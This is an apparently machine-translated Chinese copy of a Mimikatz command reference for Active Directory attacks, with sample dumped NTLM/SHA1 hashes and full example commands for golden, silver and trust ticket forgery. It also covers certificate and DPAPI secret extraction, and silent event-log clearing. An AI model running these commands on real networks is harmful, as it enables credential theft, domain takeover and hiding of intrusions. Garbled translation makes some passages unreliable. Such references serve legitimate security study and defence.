<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Authentication Id : 0 ; 646260 (00000000:0009dc74)</span><br><span class="line"> Session           : RemoteInteractive from 2</span><br><span class="line"> User Name         : adsadministrator</span><br><span class="line"> Domain            : ADSECLAB</span><br><span class="line"> Logon Server      : ADSDC03</span><br><span class="line"> Logon Time        : 11/27/2015 11:41:27 AM</span><br><span class="line"> SID               : S-1-5-21-1581655573-3923512380-696647894-500</span><br><span class="line"> msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : ADSAdministrator</span><br><span class="line"> * Domain   : ADSECLAB</span><br><span class="line"> * NTLM     : 5164b7a0fda365d56739954bbbc23835</span><br><span class="line"> * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f</span><br><span class="line"> [00010000] CredentialKeys</span><br><span class="line"> * NTLM     : 5164b7a0fda365d56739954bbbc23835</span><br><span class="line"> * SHA1     : f8db297cb2ae403f8915675cebe79643d0d3b09f</span><br><span class="line"> tspkg :</span><br><span class="line"> wdigest :</span><br><span class="line"> * Username : ADSAdministrator</span><br><span class="line"> * Domain   : ADSECLAB</span><br><span class="line"> * Password : (null)</span><br><span class="line"> kerberos :</span><br><span class="line"> * Username : adsadministrator</span><br><span class="line"> * Domain   : LAB.ADSECURITY.ORG</span><br><span class="line"> * Password : (null)</span><br><span class="line"> ssp :   KO</span><br><span class="line"> credman :</span><br></pre></td></tr></table></figure>
<h3 id="Mimikatz命令参考-："><a href="#Mimikatz命令参考-：" class="headerlink" title="Mimikatz命令参考**："></a>Mimikatz命令参考<strong>**：</strong></h3><p><strong>Mimikatz版本历史</strong></p>
<h4 id="Mimikatz模块："><a href="#Mimikatz模块：" class="headerlink" title="Mimikatz模块："></a>Mimikatz模块：</h4><ul>
<li><a href="https://adsecurity.org/?page_id=1821#BUSYLIGHT" target="_blank" rel="noopener">BUSYLIGHT</a></li>
<li>CRYPTO<ul>
<li><a href="https://adsecurity.org/?page_id=1821#CRYPTOCertificates" target="_blank" rel="noopener">CRYPTO ::证书</a></li>
</ul>
</li>
<li><a href="https://adsecurity.org/?page_id=1821#DPAPI" target="_blank" rel="noopener">DPAPI</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#EVENT" target="_blank" rel="noopener">事件</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#IIS" target="_blank" rel="noopener">IIS</a></li>
<li>KERBEROS<ul>
<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSGolden" target="_blank" rel="noopener">金门票</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#SilverTicket" target="_blank" rel="noopener">银色门票</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#TrustTicket" target="_blank" rel="noopener">信托票</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#KERBEROSPTT" target="_blank" rel="noopener">KERBEROS::PTT</a></li>
</ul>
</li>
<li>LSADUMP<ul>
<li><a href="https://adsecurity.org/?page_id=1821#DCSync" target="_blank" rel="noopener">DCSync</a></li>
<li>DCShadow</li>
<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPLSA" target="_blank" rel="noopener">LSADUMP::LSA</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPNetSync" target="_blank" rel="noopener">LSADUMP::NetSync</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPSAM" target="_blank" rel="noopener">LSADUMP::SAM</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#LSADUMPTrust" target="_blank" rel="noopener">LSADUMP ::TRUST</a></li>
</ul>
</li>
<li><a href="https://adsecurity.org/?page_id=1821#MISC" target="_blank" rel="noopener">MISC</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#MINESWEEPER" target="_blank" rel="noopener">MINESWEEPER</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#Net" target="_blank" rel="noopener">Net</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#PRIVILEGE" target="_blank" rel="noopener">PRIVILEGE</a><ul>
<li><a href="https://adsecurity.org/?page_id=1821#PRIVILEGEDebug" target="_blank" rel="noopener">PRIVILEGE ::debug</a></li>
</ul>
</li>
<li><a href="https://adsecurity.org/?page_id=1821#PROCESS" target="_blank" rel="noopener">PROCESS</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#RPC" target="_blank" rel="noopener">RPC</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#SERVICE" target="_blank" rel="noopener">SERVICE</a></li>
<li>SEKURLSA<ul>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAKerberos" target="_blank" rel="noopener">SEKURLSA::Kerberos的</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAKrbtgt" target="_blank" rel="noopener">SEKURLSA::KRBTGT</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords" target="_blank" rel="noopener">SEKURLSA::LogonPasswords</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#SEKURLSAPth" target="_blank" rel="noopener">SEKURLSA ::Pth</a></li>
</ul>
</li>
<li><a href="https://adsecurity.org/?page_id=1821#SID" target="_blank" rel="noopener">SID</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#STANDARD" target="_blank" rel="noopener">STANDARD</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#SYSENV" target="_blank" rel="noopener">SYSENV</a></li>
<li>TOKEN<ul>
<li>TOKEN ::<a href="https://adsecurity.org/?page_id=1821#TOKENElevate" target="_blank" rel="noopener">Elevate</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#TOKENElevate" target="_blank" rel="noopener">TOKEN::Elevate / domainadmin</a></li>
</ul>
</li>
<li><a href="https://adsecurity.org/?page_id=1821#TS" target="_blank" rel="noopener">TS</a></li>
<li><a href="https://adsecurity.org/?page_id=1821#VAULT" target="_blank" rel="noopener">VAULT</a></li>
</ul>
<p>注意：任何标记为“experimental”的项目都只能在测试环境中使用。</p>
<h3 id="BUSYLIGHT"><a href="#BUSYLIGHT" class="headerlink" title="BUSYLIGHT"></a><strong>BUSYLIGHT</strong></h3><p>BUSYLIGHT Mimikatz模块提供连接<a href="http://blog.cobaltstrike.com/2015/11/11/revolutionary-device-detects-mimikatz-use/" target="_blank" rel="noopener">BusyLights的</a>附加信息和控制。</p>
<p><strong>BUSYLIGHT::List</strong></p>
<p><strong>BUSYLIGHT::</strong>Off</p>
<p><strong>BUSYLIGHT::Single</strong></p>
<p><strong>BUSYLIGHT::Status</strong></p>
<p>BUSYLIGHT::Test</p>
<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a><strong>CRYPTO</strong></h3><p>CRYPTO Mimikatz模块提供了与Windows加密功能（<a href="https://msdn.microsoft.com/en-us/library/ms867086.aspx" target="_blank" rel="noopener">CryptoAPI</a>）接口的高级功能。<br>典型用途是导出未标记为“可导出”的证书。</p>
<p><strong>CRYPTO::CAPI</strong> - （实验性）Patch CryptoAPI层，便于导出</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-CAPI.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-CAPI.jpg" alt="Mimikatz-加密CAPI"></a></p>
<p><strong>CRYPTO ::Certificates</strong> - 列出/出口证书</p>
<p>Carlos Perez（又名<a href="https://twitter.com/Carlos_Perez" target="_blank" rel="noopener">DarkOperator</a>）有<a href="http://www.darkoperator.com/blog/2013/6/11/stealing-user-certificates-with-meterpreter-mimikatz-extensi.html" target="_blank" rel="noopener">一篇关于使用Mimikatz导出证书的博文</a>。<br>此命令列出了其密钥的证书和属性。它也可以导出证书。通常需要“privilege::debug”</p>
<ul>
<li>/systemstore - 可选 - 必须使用的系统存储（默认值：CERT_SYSTEM_STORE_CURRENT_USER）</li>
<li>/store - 可选 - 必须用于列出/导出证书的商店（默认值：My） - 带有crypto::stores的完整列表</li>
<li>/export - 可选 - 将所有证书导出到文件（DER中的公共部分，PFX文件中的私有部分 - 密码保护：mimikatz）</li>
</ul>
<p>本杰明对CRYPTO的评论：证书：</p>
<ul>
<li>有关列表，请参阅<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#stores" target="_blank" rel="noopener"><code>crypto::stores</code></a>有效<code>systemstore</code>列表及其输出<code>store</code>。</li>
<li>不可导出的密钥（带<code>KO - ERROR kuhl_m_crypto_exportCert ; Export / CreateFile (0x8009000b)</code>）通常可以用<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi" target="_blank" rel="noopener"><code>crypto::capi</code></a>和/或导出<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#cng" target="_blank" rel="noopener"><code>crypto::cng</code></a></li>
<li>尽管<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#capi" target="_blank" rel="noopener"><code>crypto::capi</code></a>或<a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-crypto#cng" target="_blank" rel="noopener"><code>crypto::cng</code></a>补丁，您必须在文件系统上具有正确的ACL才能访问私钥（UAC … !）</li>
<li>一些<strong>智能卡</strong>加密提供商可以报告成功的私人出口（当然不是</li>
</ul>
<p><strong>CRYPTO::CertToHW</strong>  - 尝试将软件CA导出到加密（虚拟）硬件</p>
<p><strong>CRYPTO::CNG</strong> - （实验性）修补CNG服务，便于导出（补丁“KeyIso”服务）</p>
<p><strong>CRYPTO::Extract -</strong>  [experimental]从CAPI RSA / AES提供程序中提取密钥</p>
<p><strong>CRYPTO::Hash</strong> - 使用可选的用户<strong>名哈希</strong>密码</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Crypto-Hash.png" alt="img"></p>
<p><strong>CRYPTO::Keys</strong> - 列出/导出密钥容器</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-Crypto-Keys.png" alt="img"></p>
<p><strong>CRYPTO::Providers</strong> - 列出加密提供商</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Providers.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Providers.jpg" alt="Mimikatz-加密提供商"></a></p>
<p><strong>CRYPTO::SC</strong>  - 列出智能卡读卡器</p>
<p><strong>CRYPTO::SCAuth</strong> - 从CA创建身份验证证书（类似智能卡）</p>
<p><strong>CRYPTO::Stores</strong> –列出加密商店</p>
<ul>
<li>/systemstore - 可选 - 必须用于列出存储的系统存储（默认值：CERT_SYSTEM_STORE_CURRENT_USER）</li>
</ul>
<p>存储选项：<br>CERT_SYSTEM_STORE_CURRENT_USER或CURRENT_USER<br>CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY或USER_GROUP_POLICY<br>CERT_SYSTEM_STORE_LOCAL_MACHINE或LOCAL_MACHINE<br>CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY或LOCAL_MACHINE_GROUP_POLICY<br>CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE或LOCAL_MACHINE_ENTERPRISE<br>CERT_SYSTEM_STORE_CURRENT_SERVICE或CURRENT_SERVICE<br>CERT_SYSTEM_STORE_USERS或使用者<br>CERT_SYSTEM_STORE_SERVICES或服务</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Stores.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Crypto-Stores.jpg" alt="Mimikatz-加密存储"></a></p>
<p><strong>CRYPTO::System</strong> - 描述Windows系统证书（文件，TODO：注册表或配置单元）。</p>
<h3 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a><strong>DPAPI</strong></h3><p>DPAPI Mimikatz模块提供使用DPAPI提取Windows存储（和受保护）凭据数据的功能。  <a href="https://msdn.microsoft.com/en-us/library/ms995355.aspx" target="_blank" rel="noopener">DPAPI</a>是保护（加密）本地数据（通常是密码）的官方Windows方法。</p>
<blockquote>
<p>从Microsoft®Windows®2000开始，操作系统开始提供数据保护应用程序编程接口（API）。此数据保护API（DPAPI）是一对函数调用，为用户和系统进程提供操作系统级数据保护服务。通过操作系统级，我们指的是由操作系统本身提供的服务，不需要任何其他库。通过数据保护，我们指的是通过使用加密来提供数据机密性的服务。由于数据保护是操作系统的一部分，因此每个应用程序现在都可以保护数据，而不需要除了对DPAPI进行必要的函数调用之外的任何特定加密代码。这些调用是两个简单的函数，具有修改DPAPI行为的各种选项。总体，</p>
<p>DPAPI是一种基于密码的数据保护服务。它需要密码才能提供保护。当然，缺点是DPAPI提供的所有保护都依赖于提供的密码。DPAPI使用经过验证的加密例程，特别是强大的Triple-DES算法和强密钥来抵消这一点，我们将在后面详细介绍。由于DPAPI专注于为用户提供保护并需要密码来提供此保护，因此它在逻辑上使用用户的登录密码进行保护。</p>
</blockquote>
<p>以前在攻击DPAPI方面做了一些工作：</p>
<ul>
<li><a href="https://www.elie.net/publication/reversing-dpapi-and-stealing-windows-secrets-offline" target="_blank" rel="noopener">扭转DPAPI和脱机Windows密码</a></li>
<li><a href="http://www.passcape.com/index.php?section=docsys&amp;cmd=details&amp;id=28" target="_blank" rel="noopener">DPAPI秘密。DPAPI中的安全性分析和数据恢复</a></li>
</ul>
<p>Benjamin Delpy在OneDrive上有一个Excel电子表格，其中列出了可能存储凭据的Windows位置 - <a href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&amp;app=Excel" target="_blank" rel="noopener">在线查看电子表格</a>。</p>
<p><strong>DPAPI::Blob</strong> - 使用API或Masterkey取消保护DPAPI blob</p>
<p><strong>DPAPI:Cache</strong></p>
<p><strong>DPAPI::CAPI</strong> - CAPI密钥测试</p>
<p><strong>DPAPI::Chrome</strong>  - Chrome测试</p>
<p><strong>DPAPI::CNG</strong> - CNG关键测试</p>
<p><strong>DPAPI::Cred</strong> - CRE测试</p>
<p><strong>DPAPI::CredHist</strong> - 配置Credhist文件</p>
<p><strong>DPAPI::MasterKey</strong> - 配置Masterkey文件，unprotect（取决于密钥）</p>
<p><strong>DPAPI::Protect</strong> - 使用DPAPI保护数据</p>
<p><img src="https://adsecurity.org/wp-content/uploads/2017/11/Mimikatz-DPAPI-Protect.png" alt="img"></p>
<p><strong>DPAPI::Vault</strong> - VAULT测试</p>
<p><strong>DPAPI::WIFI</strong> - WIFI测试（需要XML配置文件 - <a href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&amp;app=Excel" target="_blank" rel="noopener">参考Ben的电子表格</a>）</p>
<p><strong>DPAPI::WWAN</strong> - WWAN测试（需要XML配置文件 - <a href="https://onedrive.live.com/view.aspx?resid=A352EBC5934F0254!3104&amp;app=Excel" target="_blank" rel="noopener">参考Ben的电子表格</a>）</p>
<h3 id="事件EVENT"><a href="#事件EVENT" class="headerlink" title="事件EVENT**"></a><strong>事件</strong>EVENT<em>**</em></h3><p><strong>EVENT::Clear</strong> - 清除事件日志<br><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png" target="_blank" rel="noopener"><br><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Clear.png" alt="Mimikatz-事件清除"></a></p>
<p><strong>EVENT ::: Drop</strong> - （<strong>*实验性*</strong>）Patch Events服务以避免新事件</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Event-Drop.png" alt="Mimikatz-事件降"></a></p>
<p>注意：<br>运行privilege::debug然后运行event::drop来修补事件日志。然后运行Event::Clear以清除事件日志，而不记录任何日志清除事件（1102）。</p>
<h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a><strong>IIS</strong></h3><p>IIS XML配置模块</p>
<p><strong>IIS::APPHOST</strong></p>
<h3 id="KERBEROS"><a href="#KERBEROS" class="headerlink" title="KERBEROS"></a><strong>KERBEROS</strong></h3><p>KERBEROS Mimikatz模块用于与官方Microsoft Kerberos API连接。<br>此模块中的命令不需要特殊权限。</p>
<p><strong>KERBEROS::Ask</strong> - 要求TGS门票</p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Ask.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-Kerberos-Ask.jpg" alt="Mimikatz-Kerberos的问"></a></p>
<p><strong>KERBEROS::Clist</strong> - 列出MIT / Heimdall ccache的门票</p>
<p><strong>KERBEROS::Golden</strong> - 创建<a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">黄金</a> / <a href="https://adsecurity.org/?p=1515" target="_blank" rel="noopener">白银</a> / <a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener">信任</a>票据<br>此命令的功能基于检索到的密码哈希类型。</p>
<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>需求</strong></th>
<th><strong>范围</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">金色</a></td>
<td>KRBTGT哈希</td>
<td>域/林</td>
</tr>
<tr>
<td><a href="https://adsecurity.org/?p=1515" target="_blank" rel="noopener">银</a></td>
<td>服务哈希</td>
<td>服务</td>
</tr>
<tr>
<td><a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener">相信</a></td>
<td>信任哈希</td>
<td>域/林 - &gt;域/林 （基于帐户访问）</td>
</tr>
</tbody>
</table>
<h4 id="Golden-Ticket金票"><a href="#Golden-Ticket金票" class="headerlink" title="Golden Ticket金票"></a><strong>Golden Ticket金票</strong></h4><p>Golden Ticket是使用KRBTGT NTLM密码哈希加密和签名的TGT。</p>
<p>可以创建Golden Ticket（GT）以模拟域中任何用户（真实的或想象的）作为域中任何组的成员（提供几乎无限量的权限）到域中的任何和每个资源。由于Golden Ticket是身份验证票证（下面描述的TGT），因此其范围是整个域（以及利用SID历史记录的AD林），因为TGT用于获取用于访问资源的服务票证（TGS）。Golden Ticket（TGT）包含用户组成员资格信息（PAC），并使用域的Kerberos服务帐户（KRBTGT）进行签名和加密，该帐户只能由KRBTGT帐户打开和读取。</p>
<p>总而言之，一旦攻击者获得了对KRBTGT密码哈希的访问权限，他们就可以创建Golden Tickets（TGT），随时提供对AD中任何内容的访问。</p>
<p>Mimikatz金票命令参考：</p>
<p>创造黄金票的Mimikatz命令是“kerberos::golden”</p>
<ul>
<li>/ domain - 完全限定的域名。在此示例中：“lab.adsecurity.org”。</li>
<li>/ sid - 域的SID。在此示例中：“S-1-5-21-1473643419-774954089-2222329127”。</li>
<li>/ sids - AD林中具有您希望故障单欺骗的权限的帐户/组的其他SID。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的Enterprise Admins组。Ť <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">他的参数将提供的小岛屿发展中国家的SID历史参数。</a></li>
<li>/user - 模拟用户名</li>
<li>/groups（可选） - 用户所属的组RID（第一个是主要组）。<br>添加用户或计算机帐户RID以接收相同的访问权限。<br>默认组：513,512,520,518,519，用于众所周知的管理员组（如下所列）。</li>
<li>/krbtgt - 域KDC服务帐户（KRBTGT）的NTLM密码哈希。用于加密和签署TGT。</li>
<li>/ticket（可选） - 提供保存Golden Ticket文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。</li>
<li>/ptt - 作为/ ticket的替代 - 使用它立即将伪造的票证注入内存以供使用。</li>
<li>/id（可选） - 用户RID。Mimikatz默认值为500（默认管理员帐户RID）。</li>
<li>/startoffset（可选） - 票证可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值为0。</li>
<li>/endin（可选） - 票证生命周期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</li>
<li>/renewmax（可选） - 续订时的最长票证有效期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</li>
<li>/sids（可选） - 设置为AD林中Enterprise Admins组的SID（[ADRootDomainSID] -519），以欺骗整个AD林中的企业管理员权限（AD林中每个域中的AD管理员）。</li>
<li>/aes128 - AES128密钥</li>
<li>/aes256 - AES256密钥</li>
</ul>
<p>金票默认组：</p>
<ul>
<li>域用户SID：S-1-5-21 <domainid> -513</domainid></li>
<li>域管理员SID：S-1-5-21 <domainid> -512</domainid></li>
<li>架构管理员SID：S-1-5-21 <domainid> -518</domainid></li>
<li>企业管理员SID：S-1-5-21 <domainid> -519（仅当在林根域中创建伪造票证时才有效，但为AD林管理员权限添加使用/ sids参数）</domainid></li>
<li>组策略创建者所有者SID：S-1-5-21 <domainid> -520</domainid></li>
</ul>
<p>kerberos::golden / admin：ADMIINACCOUNTNAME / domain：DOMAINFQDN / id：ACCOUNTRID / sid：DOMAINSID / krbtgt：KRBTGTPASSWORDHASH / ptt</p>
<p>命令示例：<br><em>。\ mimikatz“kerberos::golden / admin：DarthVader /domain:rd.lab.adsecurity.org / id：9999 / sid：S-1-5-21-135380161-102191138-581311202 / krbtgt：13026055d01f235d67634e109da03321 / startoffset：0 / endin：600 / renewmax：10080 / ptt“退出</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-CreateGoldenTicket-DarthVader2.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/Mimikatz-CreateGoldenTicket-DarthVader2.png" alt="Mimikatz-CreateGoldenTicket-DarthVader2"></a></p>
<p>金票参考：</p>
<p>* <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">黄金门票现在更加黄金（有SID历史）</a></p>
<p><strong>2016</strong><br>年1月初更新<strong>：</strong> 2015年1月初，我与客户分享了检测伪造Kerberos门票的指标，随后在2015年的BSides Charm上提供了此信息。不久之后，Mimikatz更新了一个设置为静态值的域字段，通常包含字符串“eo.oe”。截至<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">2016年1月5</a>日的<a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">Mimikatz更新</a>，伪造的Kerberos票证不再包含域异常，因为<a href="https://github.com/gentilkiwi/mimikatz/commit/fbb32cdcfa688892ab91b98044c453414193bb74#diff-60c3d6f46631121e0d6f97c2a2e143c9R602" target="_blank" rel="noopener">netbios域名放置在Kerberos票证的域组件中</a>。</p>
<p>Mimikatz代码差异：<br><a href="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/05/GT-DomainFieldUpdate-20150105.jpg" alt="GT-DomainFieldUpdate-20150105"></a></p>
<p>上的困难的详细信息在所述检测伪造的Kerberos票证（金券，银门票等）在<a href="https://adsecurity.org/?p=1515#DetectingForgedKerberosTickets" target="_blank" rel="noopener">检测锻造Kerberos票证部</a>。</p>
<h4 id="Silver-Ticket-银色票"><a href="#Silver-Ticket-银色票" class="headerlink" title="Silver Ticket 银色票"></a><strong>Silver Ticket 银色票</strong></h4><p>Silver Ticket是使用目标服务帐户（由SPN映射标识）NTLM密码哈希来加密和签名的TGS（类似于TGT格式）。</p>
<p>创造银票的Mimikatz命令是“kerberos::golden”（是的，你运行’golden’来创建银票）。</p>
<p>Mimikatz Silver Ticket Command参考：</p>
<ul>
<li><strong>/</strong>domain - 完全限定的域名。在此示例中：“lab.adsecurity.org”。</li>
<li>/sid - 域的SID。在此示例中：“S-1-5-21-1473643419-774954089-2222329127”。</li>
<li>/sids - AD林中具有您希望故障单欺骗的权限的帐户/组的其他SID。通常，这将是根域“S-1-5-21-1473643419-774954089-5872329127-519”的Enterprise Admins组。Ť <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">他的参数将提供的小岛屿发展中国家的SID历史参数。</a></li>
<li>/user - 模拟用户名</li>
<li>/ groups（可选） - 用户所属的组RID（第一个是主要组）<br>默认值：513,512,520,518,519，用于众所周知的管理员组（如下所列）。</li>
<li>/ticket（可选） - 提供用于保存伪造的票证文件以供以后使用的路径和名称，或使用/ ptt立即将黄金票据注入内存以供使用。</li>
<li>/ ptt - 作为/ ticket的替代 - 使用它立即将伪造的票证注入内存以供使用。</li>
<li>/id（可选） - 用户RID。Mimikatz默认值为500（默认管理员帐户RID）。</li>
<li>/ startoffset（可选） - 票证可用时的起始偏移量（如果使用此选项，通常设置为-10或0）。Mimikatz默认值为0。</li>
<li>/ endin（可选） - 票证生命周期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为10小时（600分钟）。</li>
<li>/renewmax（可选） - 续订时的最长票证有效期。Mimikatz默认值为10年（约5,262,480分钟）。Active Directory默认Kerberos策略设置为7天（10,080分钟）。</li>
<li>/ aes128 - AES128密钥</li>
<li>/ aes256 - AES256密钥</li>
</ul>
<p>Silver Ticket必需参数：</p>
<ul>
<li>/target - 目标服务器的FQDN。</li>
<li>/service - 目标服务器上运行的kerberos服务。这是服务主体名称类（或类型），如cifs，http，mssql。</li>
<li>/rc4 - 服务的NTLM哈希值（计算机帐户或用户帐户）</li>
</ul>
<p>银票默认组：</p>
<ul>
<li>域用户SID：S-1-5-21 <domainid> -513</domainid></li>
<li>域管理员SID：S-1-5-21 <domainid> -512</domainid></li>
<li>架构管理员SID：S-1-5-21 <domainid> -518</domainid></li>
<li>企业管理员SID：S-1-5-21 <domainid> -519（仅当在林根域中创建伪造票证时才有效，但为AD林管理员权限添加使用/ sids参数）</domainid></li>
<li>组策略创建者所有者SID：S-1-5-21 <domainid> -520</domainid></li>
</ul>
<p>示例Mimikatz命令创建银票：</p>
<p>以下Mimikatz命令在服务器adsmswin2k8r2.lab.adsecurity.org上为CIFS服务创建Silver Ticket。为了成功创建此Silver Ticket，需要通过AD域转储或在本地系统上运行Mimikatz来发现adsmswin2k8r2.lab.adsecurity.org的AD计算机帐户密码哈希，如上所示（<em>Mimikatz“ privilege::debug“”sekurlsa::logonpasswords“退出</em>）。NTLM密码哈希与/ rc4参数一起使用。还需要在/ service参数中标识服务SPN类型。最后，需要在/ target参数中提供目标计算机的完全限定域名。不要忘记/ sid参数中的域SID。</p>
<p><em>mimikatz“kerberos::golden / admin：LukeSkywalker / id：1106 /domain:lab.adsecurity.org / sid：S-1-5-21-1473643419-774954089-2222329127 /target:adsmswin2k8r2.lab.adsecurity.org / rc4 ：d7e2b80507ea074ad59f152a1ba20458 / service：cifs / ptt“退出</em></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/09/SilverTicketUsage-MemberServer-CIFS-AdminShare2.png" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/09/SilverTicketUsage-MemberServer-CIFS-AdminShare2.png" alt="SilverTicketUsage-MemberServer，CIFS，AdminShare2"></a></p>
<h5 id="信托票"><a href="#信托票" class="headerlink" title="信托票"></a>信托票</h5><p>确定Active Directory信任密码哈希后（<a href="https://adsecurity.org/?page_id=1821#LSADUMP" target="_blank" rel="noopener">Mimikatz“privilege::debug”“lsadump::trust / patch”退出</a>），可以生成信任票证。<a href="https://adsecurity.org/?p=1588" target="_blank" rel="noopener">关于信任票的更多背景信息。</a></p>
<p>伪造内部AD森林信托票</p>
<p>在这个例子中，Trust门票利用Benjamin Delpy写的两个额外工具，叫做AskTGS和Kirbikator。</p>
<p><strong>第1步：转储信任密码（信任密钥）</strong></p>
<p>目前的Mimikatz版本可以提取信任密钥（密码）。<br>*  <a href="https://adsecurity.org/?page_id=1821#LSADUMP" target="_blank" rel="noopener">Mimikatz“privilege::debug”“lsadump::trust / patch”退出</a></p>
<p><a href="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-DumpTrustKeys.jpg" target="_blank" rel="noopener"><img src="https://adsecurity.org/wp-content/uploads/2015/07/TrustTicket-v2-Mimikatz-DumpTrustKeys.jpg" alt="TrustTicket-V2-Mimikatz-DumpTrustKeys"></a></p>
<p><strong>步骤2：使用Mimikatz创建伪造的信任票证（inter-realm TGT）</strong></p>
<p>伪造信托票，说明票务持有人是AD森林中的企业管理员（利用SIDHistory，“sids”，跨Mimikatz的信托，我对Mimikatz的“贡献”）。这样可以实现从子域到父域的完全管理访问。请注意，此帐户不必存在于任何地方，因为它实际上是信任的金票。</p>
<p>创建信托票的Mimikatz命令是“kerberos::golden”</p>
<ul>
<li>/domain - 完全限定的域名。在此示例中：“lab.adsecurity.org”。</li>
<li>/sid - 域的SID。在这个例子中：“S-1-5-21-3677078698-724690114-1972670770”。</li>
<li>/ sids - AD林中具有您希望故障单欺骗的权限的帐户/组的其他SID。通常，这将是根域“S-1-5-21-1581655573-3923512380-696647894-519”的Enterprise Admins组。Ť <a href="https://adsecurity.org/?p=1640" target="_blank" rel="noopener">他的参数将提供的小岛屿发展中国家的SID历史参数。</a></li>
<li>/user - 模拟用户名</li>
<li>/ groups（可选） - 用户所属的组RID（第一个是主要组）<br>默认值：513,512,520,518,519，用于众所周知的管理员组（如下所列）。</li>
